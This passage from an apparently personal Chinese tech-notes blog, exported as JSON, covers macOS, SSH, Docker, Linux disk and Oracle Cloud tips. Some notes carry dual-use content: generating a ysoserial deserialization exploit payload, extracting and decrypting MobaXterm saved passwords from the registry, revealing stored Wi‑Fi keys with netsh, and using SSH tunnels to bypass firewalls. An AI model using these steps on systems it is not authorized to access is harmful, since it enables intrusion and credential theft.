上卸载或删除软件后，图标可能仍会存在于 Launchpad 中，清除方式如下。\n进入 db 目录\n/private/var/folders/fm/xrz9qhzj5snf0s3btxb3jw280000gn/0/com.apple.dock.launchpad/db\n\n\n不确定目录位置可以先进入 /private/var/folders/fm 再搜索 com.apple.dock.launchpad，搜索范围选择 folders。\n\n文件夹下有多个文件，\ndb     db-shm db-wal\n使用 sqlite 操作 db 文件，\nsqlite3 db &quot;delete from apps where title=&#039;Trilium Notes&quot;\n并重启 Dock\nkillall Dock"},"til/issues/Mac-上启动-OpenLDAP":{"title":"Mac 上启动 OpenLDAP","links":[],"tags":["mac","ldap","issues"],"content":"Mac 默认安装了 openldap，启动方式如下，执行\nslappasswd\n生成密钥，在 /etc/openldap 下创建配置文件 slapd.conf \ncp slapd.conf.default slapd.conf\n修改 rootpw 字段，填入刚刚生成的密钥\nrootpw      {SSHA}LDAN/F815HvwHmMUsUX4byoK9aoo2p8m\n启动\n/usr/libexec/slapd -d 255\nReference\n\nStarting OpenLDAP on Mac OS X Client - krypted\n"},"til/issues/Mac-开启-SSHD-服务":{"title":"Mac 开启 SSHD 服务","links":[],"tags":[],"content":"本地化伪分布式部署 Hadoop 时需要用到 ssh，这里记录 Mac 下开启 sshd 的步骤。\n\n在 Mac 上打开 Remote Login 访问权限\n\n勾选 Apple menu &gt; System Preferences &gt; Sharing &gt; Remote Login\n选择当前用户\n\n\n检查 sshd 配置，文件位于 /etc/ssh/sshd_confg\n生成 ssh 公私钥，将公钥放入 ~/.ssh/authorized_keys 中\n\nssh-keygen -t rsa -P &#039;&#039; -f ~/.ssh/id_rsa 『注意不要覆盖已有文件』\ncat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys\nchmod 0600 ~/.ssh/authorized_keys\n\n\n启动 sshd 服务\n\nsudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist\n\n\n关闭 sshd 服务\n\nsudo launchctl unload -w /System/Library/LaunchDaemons/ssh.plist\n\n\n检查服务是否启动\n\nsudo launchctl list | grep sshd\n\n\n\n完成后，尝试进行连接\nssh localhost"},"til/issues/OrbStack-卸载":{"title":"OrbStack 卸载","links":[],"tags":["orbstack","issues"],"content":"OrbStack 的资源消耗确实比 Docker Desktop 好不少，但是出于个人原因，还是把它卸载并换回了 Docker Desktop。卸载过程『从 Application 中直接删除 OrbStack，官方文档 推荐的也是这样』中遇到了以下问题\ndocker images\nCannot connect to the Docker daemon at unix:///Users/trganda/.orbstack/run/docker.sock. Is the docker daemon running?\n查看了一下 Docker 的文档，需要使用 docker 命令行工具修改当前 context。切换回 Docker Destkop 默认的 sock。\ndocker context list\nNAME                TYPE                DESCRIPTION                               DOCKER ENDPOINT                                   KUBERNETES ENDPOINT   ORCHESTRATOR\ndefault             moby                Current DOCKER_HOST based configuration   unix:///var/run/docker.sock                                             swarm\ndesktop-linux       moby                                                          unix:///Users/trganda/.docker/run/docker.sock\norbstack *          moby                OrbStack                                  unix:///Users/trganda/.orbstack/run/docker.sock\n当前的 context，可以看到 orbstack 为默认值，进行修改\ndocker context use default\n并删除 orbstack\ndocker context rm orbstack"},"til/issues/Ranger-with-Kitty-图片预览":{"title":"Ranger with Kitty 图片预览","links":[],"tags":["kitty","ranger","issues"],"content":"\n使用环境 macOS Ventura 13.2\n\n安装 Kitty 和 Ranger\n从 kovidgoyal/kitty: Cross-platform, fast, feature-rich, GPU based terminal (github.com) 下载对应版本的 kitty 并进行安装即可。\n通过 brew 安装 ranger\nbrew install ranger\n配置 Ranger\n编辑配置文件\nvim ~/.config/ranger/rc.config\n添加以下内容\nset preview_images true\nset preview_images_method kitty\n并安装 pillow 库\npip install pillow\n安装完成后就可以在 kitty 中通过 ranger 预览图片了。\n\n错误 Image Previews in Kitty Require PIL (pillow)\n如果出现此错误可能是 pillow 安装所用的 python 环境与运行 ranger 所在的 python 环境不是同一个。此时可以查看 ranger 文件的头部内容，确认使用的 python 版本和路径。以 brew 安装方式为例，\n\nranger 所用 python 环境的路径如下，\n/opt/homebrew/opt/python@3.11/bin/python3.11\n手动指定完整的 pip 路径安装 pillow 即可。\n/opt/homebrew/opt/python@3.11/bin/pip3 install pillow"},"til/issues/SSH-端口转发":{"title":"SSH 端口转发","links":["ref1"],"tags":["ssh","issues"],"content":"\n防火墙阻断了 HTTP 协议访问目标机器，但是 SSH 正常。可以通过 SSH 的动态转发功能绕过此限制。\n\n动态转发\n以下内容，修改自[1]\n动态转发指的是，本机与 SSH 服务器之间创建了一个加密连接，然后本机内部针对某个端口的通信，都通过这个加密连接转发。它的一个使用场景就是，访问所有外部网站，都通过 SSH 转发。\n动态转发需要把本地端口绑定到 SSH 服务器。至于 SSH 服务器要去访问哪一个网站，完全是动态的，取决于原始通信，所以叫做动态转发。\n下面命令中，-D 表示动态转发，local-port 是本地端口，tunnel-host 是 SSH 服务器，-N 表示这个 SSH 连接只进行端口转发，不登录远程 Shell，不能执行远程命令，只能充当隧道。\nssh -D local-port user@tunnel-host -N\n举例来说，如果本地端口是 2121，那么动态转发的命令就是下面这样。\nssh -D 2121 user@tunnel-host -N\n输入密码后，会在本地的 2121 端口开启一个 SOCK5 代理，之后使用该代理访问目标地址，如\ncurl -x sock5://127.0.0.1:2121 example.com\n如果经常使用动态转发，可以将设置写入 SSH 客户端的用户个人配置文件 ~/.ssh/config。\nDynamicForward tunnel-host:local-port\n\n参考\n\nwangdoc.com/ssh/port-forwarding#%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91\n"},"til/issues/SSH-走-HTTP-代理或者-SOCKS5-代理":{"title":"SSH 走 HTTP 代理或者 SOCKS5 代理","links":[],"tags":["ssh","issues"],"content":"有时候你的 SSH 因为某些原因, 或者你的 VPS 的 SSH 端口被某些无法阻挡的力量被封禁了, 你使用普通的 SSH 方式无法登录你的服务器, 所以这时候我们需要使用一些方式, 让你的 SSH 通过代理连接你的服务器, 进而解决这个问题.\n直接配置\n如何让你的 ssh 链接使用 socks 代理呢, 我们可以使用 nc 命令, 使用 ssh 的 ProxyCommand 配合 nc 可以让 ssh 通过你设置的代理访问服务器\n其中使用 ProxyCommand 命令, 带上具体内容 nc -X 5 -x 127.0.0.1:1080 %h %p, 127.0.0.1:1080 是你的代理实际地址和端口 最后边的 root@server 是你需要登录的服务器和用户名\nnc 命令的常用参数:\n-X 是指定代理协议\n\n4 是 socks4 协议\n5 是 socks5 协议\n\n-x 是指定代理服务器和端口[代理服务器: 端口]\n\n默认 socks 使用 1080\nHTTPS 使用 3128\n\nAlias\n使用 alias 方式也可以:\n打开你的 .bashrc 或者 .zshrc 配置 alias\n保存退出后输入一下:\n下次我们访问服务器的时候直接输入 connserver 就行\nConfig 方式\n我们也可以使用 ssh 的 config 配置，编辑 ssh 的配置文件, 没有这个文件的话, 自己创建一下:\n然后写入以下命令\n下次使用 ssh 的时候就不需要配置代理了\n有时候你没有 socks 代理的时候, 我们借助 corkscrew 可以让 ssh 使用 HTTP 代理\n由于我这里是 macOS 系统, 我就直接用 brew 安装 corkscrew:\n安装完成之后我们打开 ssh 的 config 文件修改成使用 corkscrew 的 http 代理方式:\n写入:\n/usr/local/bin/corkscrew 是 corkscrew 的可执行文件路径, 如果您和我的不一样, 可以修改成正确的地址\n127.0.0.1 8080 是你的 HTTP 代理端口, 注意中间有空格, 保存退出后这个时候 ssh 可以通过你设置的 http 代理进行访问你的服务器了.\n注意,这种方式生效是全局的, 可能会影响到你的 git 使用 ssh 的方式 clone 或者 push\n全文完 题图\n\nLinux\nGit\n"},"til/issues/Win10-查看-WIFI-密码":{"title":"Win10 查看 WIFI 密码","links":[],"tags":["issues","wifi","win10"],"content":"四哥分享的技巧，以下内容复制自 scz.617.cn/windows/202303012116.txt 。\n这算是个奇技淫巧，大多数人这辈子都不知道；另有一些相关行业人士早就知道，但大概率这辈子都不会用上；换句话说，这是个鸡肋技巧。不过，干咱们这行的，多知道一些总归不会错的。\n确保 wlansvc 服务启动中，没有无线网络的台式机，该服务未启动\n$ sc query wlansvc | findstr STATE        STATE              : 4  RUNNING\n查看曾经连接过的无线网络\n$ netsh wlan show profiles...User profiles-------------    All User Profile     : any    All User Profile     : some    All User Profile     : meeting_5GHz    All User Profile     : meeting_2.4GHz\n若 wlansvc 服务未启动，上述命令报错\n$ netsh wlan show profilesThe Wireless AutoConfig Service (wlansvc) is not running.\n假设一切顺利，如下命令可查看指定无线网络的明文密码\n$ netsh wlan show profiles name=&quot;some&quot; key=clear | findstr /C:&quot;Key Content&quot;    Key Content            : XXXXXXXXXXXXXXXX"},"til/issues/Windows-中运行-Ysoserial.jar，序列化数据头部错误":{"title":"Windows 中运行 Ysoserial.jar，序列化数据头部错误","links":[],"tags":["win","ysoserial","powershell"],"content":"起因\n在 Windows 中使用 ysoserial.jar 生成 payload 并写入文件\njava -jar ysoserial.jar CommonsBeanutils1 &quot;notepad&quot; &gt; poc.ser\n文件 poc.ser 的头部却不是 ACED\n➜  hexdump -C poc.ser\n00000000  ff fe 08 e1 00 00 05 00  73 00 72 00 00 00 17 00  |........s.r.....|\n00000010  6a 00 61 00 76 00 61 00  2e 00 75 00 74 00 69 00  |j.a.v.a...u.t.i.|\n00000020  6c 00 2e 00 50 00 72 00  69 00 6f 00 72 00 69 00  |l...P.r.i.o.r.i.|\n00000030  74 00 79 00 51 00 75 00  65 00 75 00 65 00 b1 65  |t.y.Q.u.e.u.e..e|\n00000040  30 00 37 8d 3f 00 59 50  03 00 00 00 02 00 49 00  |0.7.?.YP......I.|\n00000050  00 00 04 00 73 00 69 00  7a 00 65 00 4c 00 00 00  |....s.i.z.e.L...|\n尝试解决\n查看 ysoserial 与输出相关的源码\npublic class GeneratePayload {\n   private static final int INTERNAL_ERROR_CODE = 70;\n   private static final int USAGE_CODE = 64;\n \n   public static void main(final String[] args) {\n      if (args.length != 2) {\n         printUsage();\n         System.exit(USAGE_CODE);\n      }\n      final String payloadType = args[0];\n      final String command = args[1];\n \n      final Class&lt;? extends ObjectPayload&gt; payloadClass = Utils.getPayloadClass(payloadType);\n      if (payloadClass == null) {\n         System.err.println(&quot;Invalid payload type &#039;&quot; + payloadType + &quot;&#039;&quot;);\n         printUsage();\n         System.exit(USAGE_CODE);\n         return; // make null analysis happy\n      }\n \n      try {\n         final ObjectPayload payload = payloadClass.newInstance();\n         final Object object = payload.getObject(command);  // [1]\n         PrintStream out = System.out;\n         Serializer.serialize(object, out);\n         ObjectPayload.Utils.releasePayload(payload, object);\n默认输出对象为 System.out。尝试将序列化结果写入文件，在 [1] 后添加如下代码\nObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;pocs.ser&quot;));\noos.writeObject(object);\n输出文件的头部是正常的。\n00000000  ac ed 00 05 73 72 00 17  6a 61 76 61 2e 75 74 69  |....sr..java.uti|\n00000010  6c 2e 50 72 69 6f 72 69  74 79 51 75 65 75 65 94  |l.PriorityQueue.|\n00000020  da 30 b4 fb 3f 82 b1 03  00 02 49 00 04 73 69 7a  |.0..?.....I..siz|\n00000030  65 4c 00 0a 63 6f 6d 70  61 72 61 74 6f 72 74 00  |eL..comparatort.|\n00000040  16 4c 6a 61 76 61 2f 75  74 69 6c 2f 43 6f 6d 70  |.Ljava/util/Comp|\n00000050  61 72 61 74 6f 72 3b 78  70 00 00 00 02 73 72 00  |arator;xp....sr.|\n00000060  2b 6f 72 67 2e 61 70 61  63 68 65 2e 63 6f 6d 6d  |+org.apache.comm|\n从前后的结果对比可以发现另一个最大的区别，前者字符后跟着 00，猜测它占用了 2 个字节。那么这个问题应该和控制台或系统的默认编码方式有关。\n我尝试了以下几种方式\njava &quot;-Dfile.encoding=UTF-8&quot; -jar ysoserial.jar CommonsBeanutils1 &quot;notepad&quot; &gt; poc.ser\n或者修改控制台输出编码\nchcp 65001\n并没有什么用。\n我想可能是重定向符对编码做了什么，于是尝试\njava &quot;-Dfile.encoding=UTF-8&quot; -jar ysoserial.jar CommonsBeanutils1 &quot;notepad&quot; | Out-File poc.ser -Encoding utf8\n输出结果正常了一点点，头部依然有问题，为什么会变成 ef bb bf ee 84 88\n00000000  ef bb bf ee 84 88 00 05  73 72 00 17 6a 61 76 61  |........sr..java|\n00000010  2e 75 74 69 6c 2e 50 72  69 6f 72 69 74 79 51 75  |.util.PriorityQu|\n00000020  65 75 65 e6 96 b1 30 e8  b4 b7 3f e5 81 99 03 00  |eue...0...|\n00000030  02 49 00 04 73 69 7a 65  4c 00 0d 0a 63 6f 6d 70  |.I..sizeL...comp|\n00000040  61 72 61 74 6f 72 74 00  16 4c 6a 61 76 61 2f 75  |aratort..Ljava/u|\n00000050  74 69 6c 2f 43 6f 6d 70  61 72 61 74 6f 72 3b 78  |til/Comparator;x|\n00000060  70 00 00 00 02 73 72 00  2b 6f 72 67 2e 61 70 61  |p....sr.+org.apa|\n最后我放弃 Powershell，改用传统的 cmd，结果出乎意料的没问题。\njava -jar ysoserial.jar CommonsBeanutils1 &quot;notepad&quot; &gt; pocs.ser\nhexdump -C pocs.ser\n00000000  ac ed 00 05 73 72 00 17  6a 61 76 61 2e 75 74 69  |....sr..java.uti|\n00000010  6c 2e 50 72 69 6f 72 69  74 79 51 75 65 75 65 94  |l.PriorityQueue.|\n00000020  da 30 b4 fb 3f 82 b1 03  00 02 49 00 04 73 69 7a  |.0..?.....I..siz|\n00000030  65 4c 00 0a 63 6f 6d 70  61 72 61 74 6f 72 74 00  |eL..comparatort.|\n00000040  16 4c 6a 61 76 61 2f 75  74 69 6c 2f 43 6f 6d 70  |.Ljava/util/Comp|\n00000050  61 72 61 74 6f 72 3b 78  70 00 00 00 02 73 72 00  |arator;xp....sr.|\n后记\n我还是不清楚在使用 powershell 执行这段命令的时候，发生了什么导致结果是非预期的。\n更新 2023.2.28\n我再次尝试 powershell，不过这次换了编码，得到了预期的结果。\njava -jar ysoserial.jar CommonsBeanutils1 &quot;notepad&quot; | Out-File poc.ser -Encoding oem\n其中 ome 表示使用 MS-DOS 和控制台程序的默认编码。\n参考\n\nOut-File (Microsoft.PowerShell.Utility) - PowerShell | Microsoft Learn\n"},"til/issues/asciinema-记录终端并转-Gif":{"title":"asciinema 记录终端并转 Gif","links":[],"tags":["gif","issues","asciinema"],"content":"在终端启用记录\nasciinema rec\n出现如下提示\nasciinema: recording asciicast to /var/folders/fm/xrz9qhzj5snf0s3btxb3jw280000gn/T/tmpy28p758a-ascii.cast\nasciinema: press &lt;ctrl-d&gt; or type &quot;exit&quot; when you&#039;re done\n\n随意输入一些命令\n➜  ~ pwd\n/Users/trganda\n➜  ~ whoami\ntrganda\n➜  ~\nasciinema: recording finished\nasciinema: press &lt;enter&gt; to upload to asciinema.org, &lt;ctrl-c&gt; to save locally\nasciinema: asciicast saved to /var/folders/fm/xrz9qhzj5snf0s3btxb3jw280000gn/T/tmpy28p758a-ascii.cast\n\n结束后，可以选择上传或保存至本地。\n转 Gif\n安装，需要使用 Rust 的包管理器，Cargo\ncargo install --git github.com/asciinema/agg\n\n使用 agg\nagg --theme monokai --font-size 20 --cols 120 --rows 24 /var/folders/fm/xrz9qhzj5snf0s3btxb3jw280000gn/T/tmpy28p758a-ascii.cast demo.gif\n效果如下\n"},"til/issues/如何为-Linux-的分区拓展空间":{"title":"如何为 Linux 的分区拓展空间","links":[],"tags":["linux","fdisk"],"content":"\n使用 fdisk 删除旧分区，再新建分区，不会删除分区中原有的数据，但以防万一建议进行备份。\n\n如果是修改 / 路径挂载的分区，需通过 USB Live 系统启动进行操作\n假设有如下分区，其中 /dev/sdb3 后有空闲的空间\n/dev/sdb1\n/dev/sdb2\n/dev/sdb3\n\n操作步骤如下，非 live 情况下，需要先 unmout\nfdisk /dev/sdb\n删除旧分区\nd -&gt; 3\n\n创建新分区，并包含所有空闲空间\nn\n\n检查分区并验证是否包含错误，同时提示进行修复\ne2fsck -f /dev/sdb3\ne2fsck 1.41.12 (17-May-2010)\nPass 1: Checking inodes, blocks, and sizes\nPass 2: Checking directory structure\nPass 3: Checking directory connectivity\nPass 4: Checking reference counts\nPass 5: Checking group summary information\n/dev/sdb3: 2997/131072 files (0.5% non-contiguos), 164355/524112 blocks\n使用 resize2fs 拓展文件分区，完成这一步就可以了。\nresize2fs /dev/sdb3\nresize2fs 1.41.12 (17-May-2010)\nResizing the file system on /dev/sdc1 to 3145720 (4k) blocks.\nThe file system on /dev/sdc1 is now 3145720 blocks long."},"til/issues/查看-MobaXterm-中的密码":{"title":"查看 MobaXterm 中的密码","links":[],"tags":["mobaxterm","issues"],"content":"免费版本不支持查看保存的 ssh 密码。需要借助 HyperSine/how-does-MobaXterm-encrypt-password 工具。\n查看加密后的密码\n首先，先查看保存的密码，这里将密码保存至注册表中。\n\n使用以下命令查看。\nreg query HKEY_CURRENT_USER\\Software\\Mobatek\\MobaXterm\\C   # Credentials\nreg query HKEY_CURRENT_USER\\Software\\Mobatek\\MobaXterm\\P   # Passwords\n解密\n克隆 HyperSine/how-does-MobaXterm-encrypt-password: This repo offers a tool to reveal password encrypted by MobaXterm. (github.com)\ngit clone github.com/HyperSine/how-does-MobaXterm-encrypt-password\n执行\ncd how-does-MobaXterm-encrypt-password\npip3 uninstall pycrypto\npip3 install pycryptodome\npip3 install Crypto\n \npython3 MobaXtermCipher.py dec -p master密码 加密后的密码\npython3 中使用该脚本可能会出现错误信息\nLookupError: unknown encoding: ansi\n\n将代码中的 ansi 替换为 utf-8 即可。\n参考\n\nMobaXterm中密码的查看方式 - 知乎 (zhihu.com)\n"},"til/issues/甲状腺结节与胆结石注意事项":{"title":"甲状腺结节与胆结石注意事项","links":[],"tags":[],"content":"作息\n\n保持充足的睡眠，少熬夜，不可过度劳累\n睡前关灯躺着玩手机\n\n心情\n\n保持心情愉悦，一般忌郁闷、愤怒、急躁\n\n饮食\n不建议\n\n少辣\n低盐\n少吃油腻食物\n\n推荐\n\n首推南瓜\n维生素A的食物，如玉米、青菜、白菜、香菇、黑木耳、藕、海带、银耳、黄瓜等\n用植物油炒菜，菜以炖、烩、蒸为主，少油炸或油煎（最好不要）。\n肉类选择高营养、低脂肪的，无筋的瘦肉、去皮鸡肉(但不能喝鸡汤)、牛肉、兔肉、有鳞的鱼(如鲫鱼)\n新鲜水果：猕猴桃（首推）、桃、杏、枣、橙、西瓜等。\n按时吃早餐，不可空腹的时间太长。\n多饮水、多吃米汤、玉米汤、藕粉等食物，以降低胆汁黏稠度，有利于胆汁的分泌和排泄。\n\n运动"},"til/issues/甲骨文云主机引导盘扩容":{"title":"甲骨文云主机引导盘扩容","links":[],"tags":["issues"],"content":"甲骨文云主机免费服务提供总计 200 G 的引导卷。默认创建主机时选择的是 47G。现在有一台 47G 的主机，希望对它进行扩容使用剩余的免费容量。\n首先进入引导卷的设置页面，修改目标主机的引导卷大小\n\n修改完成之后保存。\n步骤\n跟随提示中的指引信息，首先扫描磁盘空间\n扫描磁盘空间\n先查看当前磁盘设备\nfdisk -l\n这里要调整的是 /dev/sda\n\n根据文档，使用如下命令扫描磁盘，替换 &lt;device_name&gt; 为 sda，请根据个人情况进行修改。\nsudo dd iflag=direct if=/dev/&lt;device_name&gt; of=/dev/null count=1\n\t\techo &quot;1&quot; | sudo tee /sys/class/block/&lt;device_name&gt;/device/rescan\n成功的话输出如下\n1+0 records in\n1+0 records out\n512 bytes copied, 0.000515919 s, 992 kB/s\n1\n重新分区\n下一步需要对磁盘重新进行分区，在完成扫描后使用 lsblk 查看当前分区大小会发现并没有变化，仍为 47G。\nlsblk\nNAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS\nloop0     7:0    0 49.1M  1 loop /snap/core18/2788\nloop1     7:1    0 26.8M  1 loop /snap/oracle-cloud-agent/59\nloop2     7:2    0 46.4M  1 loop /snap/snapd/19459\nloop3     7:3    0 49.1M  1 loop /snap/core18/2794\nloop4     7:4    0   26M  1 loop /snap/oracle-cloud-agent/64\nloop5     7:5    0 35.5M  1 loop /snap/snapd/19998\nsda       8:0    0  106G  0 disk\n├─sda1    8:1    0 46.5G  0 part /\n└─sda15   8:15   0   99M  0 part /boot/efi\n使用 fdisk 工具对 /dev/sda 重新分区\nsudo fdisk /dev/sda\n\n此时可能会出现告警信息，GPT PMBR size mismatch (97677311 != 222298111) will be corrected by write，这表示磁盘有连续的剩余空间，但是分区并未使用。\n\n首先查看当前分区\nCommand (m for help): p\n \nDisk /dev/sda: 106 GiB, 113816633344 bytes, 222298112 sectors\nDisk model: BlockVolume\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 4096 bytes\nI/O size (minimum/optimal): 4096 bytes / 1048576 bytes\nDisklabel type: gpt\nDisk identifier: DE0E1BB8-5D41-4D4F-9B29-D9FF2D154D65\n \nDevice      Start      End  Sectors  Size Type\n/dev/sda1  206848 97677278 97470431 46.5G Linux filesystem\n/dev/sda15   2048   204800   202753   99M EFI System\n这里要先删除 /dev/sda1 对应对分区，先查看分区信息\nCommand (m for help): i\nPartition number (1,15, default 15): 1\n \n         Device: /dev/sda1\n          Start: 206848\n            End: 97677278\n        Sectors: 97470431\n           Size: 46.5G\n           Type: Linux filesystem\n      Type-UUID: 0FC63DAF-8483-4772-8E79-3D69D8477DE4\n           UUID: E5E894D8-90B3-48F4-A059-C494218DC0D8\n删除该分区\nCommand (m for help): d\nPartition number (1,15, default 15): 1\n \nPartition 1 has been deleted.\n再重新创建分区，注意无需删除 ext4 标记\nCommand (m for help): n\nPartition number (1-14,16-128, default 1):\nFirst sector (34-222298078, default 206848):\nLast sector, +/-sectors or +/-size{K,M,G,T,P} (206848-222298078, default 222298078):\n \nCreated a new partition 1 of type &#039;Linux filesystem&#039; and of size 105.9 GiB.\nPartition #1 contains a ext4 signature.\n \nDo you want to remove the signature? [Y]es/[N]o: n\n之后输入 wq 对修改进行保存。完成后重启机器即可，再次查看磁盘分区情况，修改已经生效。\nlsblk\nNAME    MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS\nloop0     7:0    0  49.1M  1 loop /snap/core18/2788\nloop1     7:1    0  49.1M  1 loop /snap/core18/2794\nloop2     7:2    0  26.8M  1 loop /snap/oracle-cloud-agent/59\nloop3     7:3    0    26M  1 loop /snap/oracle-cloud-agent/64\nloop4     7:4    0  46.4M  1 loop /snap/snapd/19459\nloop5     7:5    0  35.5M  1 loop /snap/snapd/19998\nsda       8:0    0   106G  0 disk\n├─sda1    8:1    0 105.9G  0 part /\n└─sda15   8:15   0    99M  0 part /boot/ef\n参考\n\ndocs.oracle.com/en-us/iaas/Content/Block/Tasks/rescanningdisk.htm 『重新扫描云主机的磁盘空间』\n"},"til/issues/甲骨文云免费套餐":{"title":"甲骨文云免费套餐","links":["articles/tech/linux/iptables/iptables-学习记录","til/issues/甲骨文云主机引导盘扩容"],"tags":["issues"],"content":"Oracle Cloud 提供一下称为 Always Free 的服务，只要注册即可享受下图中提供的云服务。\n\n有关这项服务的具体介绍，见 Always Free。需要注意的是此项服务有资源回收策略，见如下说明\nIdle Always Free compute instances may be reclaimed by Oracle. Oracle will deem virtual machine and bare metal compute instances as idle if, during a 7-day period, the following are true:\n\nCPU utilization for the 95th percentile is less than 15%\nNetwork utilization is less than 15%\nMemory utilization is less than 15% (applies to A1 shapes only)\n\n这里的 95th 是表示统计计算方法，见下图\n\n云主机的端口访问问题\n如果在云主机内部监听某项端口以提供服务，为了让外部能够访问该服务，需要配置 VCN 子网的安全策略并在云主机中配置防火墙策略。\n这里以操作系统为 ubuntu 为例进行说明，可修改 /etc/iptables/rules.v4 文件来放行入站端口，先备份\ncp /etc/iptables/rules.v4 /etc/iptables/rules.v4.bak\n假设要允许外部对 8080 端口的访问，则在其中添加如下内容\n-A INPUT -p tcp --dport 8080 -j ACCEPT\n\n之后重新加载防火墙策略\niptables-restore &lt; /etc/iptables/rules.v4\n\n有关 iptables 的具体内容，见 iptables 学习记录。\n\n完成上述步骤后需要在安全策略中同步配置，放行 8080 端口。\n\n云主机的扩容\n可参考 甲骨文云主机引导盘扩容。\n参考\n\ndocs.oracle.com/en-us/iaas/Content/FreeTier/freetier_topic-Always_Free_Resources.htm 『Always Free 的详细介绍』\nhelp.aliyun.com/document_detail/32321.html 『什么是弹性公网 IP』\nhelp.aliyun.com/document_detail/357741.html 『使用 VPC 附加网段实现 EIP 网卡可见』\n"}}